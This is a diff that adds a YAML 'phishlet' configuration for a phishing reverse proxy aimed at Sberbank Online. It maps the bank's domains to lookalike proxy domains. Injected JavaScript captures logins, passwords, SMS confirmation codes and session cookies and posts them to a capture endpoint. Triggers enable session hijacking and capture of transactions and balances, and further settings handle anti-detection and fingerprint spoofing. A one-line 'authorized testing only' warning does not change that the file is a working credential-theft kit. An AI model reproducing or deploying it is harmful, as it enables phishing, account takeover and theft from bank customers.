@@ -1,0 +1,250 @@
+# ============================================================================
+# SberBank Online Phishlet
+# Полный перехват сессий СберБанк Онлайн
+# ============================================================================
+
+id: sberbank
+name: SberBank Online (СберБанк)
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий СберБанк Онлайн:
+  - Вход по паролю
+  - SMS подтверждение
+  - Push подтверждение
+  - Переводы и платежи
+  
+  ⚠️ WARNING: Только для авторизованного тестирования!
+
+target:
+  primary: "online.sberbank.ru"
+  secondary:
+    - "www.sberbank.ru"
+    - "sberbank.ru"
+    - "api.sberbank.ru"
+    - "m.sberbank.ru"
+    - "ib5.sberbank.ru"
+
+sub_filters:
+  - type: "domain"
+    from: "online.sberbank.ru"
+    to: "online.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "www.sberbank.ru"
+    to: "www.phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "sberbank.ru"
+    to: "phantom-proxy.com"
+    priority: 3
+    
+  - type: "domain"
+    from: "api.sberbank.ru"
+    to: "api.phantom-proxy.com"
+    priority: 4
+
+  - type: "domain"
+    from: "cdn.sberbank.ru"
+    to: "cdn.phantom-proxy.com"
+    priority: 100
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] SberBank phishlet loaded');
+    
+    const sberCapture = {
+      // Перехват логина/пароля
+      captureLogin: function(form) {
+        const login = form.querySelector('input[name="login"]')?.value || 
+                      form.querySelector('input[type="text"]')?.value || '';
+        const password = form.querySelector('input[type="password"]')?.value || '';
+        
+        if (login || password) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'sberbank_login',
+              login: login,
+              password: password,
+              url: window.location.href,
+              timestamp: Date.now()
+            })
+          });
+        }
+      },
+      
+      // Перехват SMS кода
+      captureSMS: function(code) {
+        if (code && code.length >= 4 && /^\d+$/.test(code)) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'sberbank_sms',
+              code: code,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват сессии
+      captureSession: function() {
+        const cookies = {
+          sberSession: this.getCookie('sberSession'),
+          SBERBANK_SESSION: this.getCookie('SBERBANK_SESSION'),
+          JSESSIONID: this.getCookie('JSESSIONID'),
+          sb_sessionid: this.getCookie('sb_sessionid')
+        };
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'sberbank_session',
+            cookies: cookies,
+            url: window.location.href
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    // Перехват форм
+    document.addEventListener('submit', function(e) {
+      const form = e.target;
+      if (form.action && form.action.includes('sberbank')) {
+        e.preventDefault();
+        sberCapture.captureLogin(form);
+        setTimeout(() => form.submit(), 1000);
+      }
+    }, true);
+    
+    // Перехват SMS input
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT') {
+        const name = e.target.name || e.target.id;
+        if (name.includes('sms') || name.includes('code') || name.includes('confirm')) {
+          if (e.target.value.length >= 4) {
+            sberCapture.captureSMS(e.target.value);
+          }
+        }
+      }
+    }, true);
+    
+    // Захват при загрузке
+    window.addEventListener('load', function() {
+      sberCapture.captureSession();
+    });
+    
+    // Скрытие
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+    
+  })();
+
+triggers:
+  - name: "sberbank_login"
+    path_regex: "/login|/auth|/authorization|/main.html"
+    actions:
+      - type: "inject_js"
+        payload: "sberbank_login.js"
+      - type: "capture_form"
+        fields: ["login", "password", "passwd", "Username"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "sberbank_sms"
+    path_regex: "/sms|/confirm|/verify|/otp"
+    actions:
+      - type: "capture_form"
+        fields: ["sms_code", "code", "confirmationCode", "otp"]
+      - type: "wait_for_input"
+        timeout: 180
+      - type: "push_notification"
+        enabled: true
+        
+  - name: "sberbank_main"
+    host_regex: "online.sberbank.ru"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["sberSession", "SBERBANK_SESSION", "JSESSIONID"]
+      - type: "session_hijack"
+        enabled: true
+      - type: "capture_transactions"
+        enabled: true
+      - type: "capture_balance"
+        enabled: true
+
+cookies:
+  critical:
+    - "sberSession"
+    - "SBERBANK_SESSION"
+    - "JSESSIONID"
+    - "sb_sessionid"
+    - "SB_API_TOKEN"
+    
+  session:
+    - "SB_UID"
+    - "SB_SID"
+    - "track_id"
+    
+  additional:
+    - "sber_device_id"
+    - "fingerprint"
+
+headers:
+  - "Authorization"
+  - "X-Sberbank-Session"
+  - "X-Sberbank-Device-ID"
+  - "X-Request-ID"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+  timezone_spoof: "Europe/Moscow"
+  language_spoof: "ru-RU"
+  # Особая защита для банка
+  ssl_pinning_bypass: true
+  certificate_transparency_bypass: true
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+  enable_brotli: true
+  # Приоритет скорости для банка
+  high_priority: true
+
+ssl:
+  min_version: "TLS1.2"
+  # Полная совместимость со СберБанком
+  cipher_suites:
+    - "TLS_AES_256_GCM_SHA384"
+    - "TLS_AES_128_GCM_SHA256"
+    - "TLS_CHACHA20_POLY1305_SHA256"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/sberbank/"
+  log_timezone: "Europe/Moscow"
+  # Дополнительное логирование для банка
+  log_sensitive: true
+  encrypt_logs: true
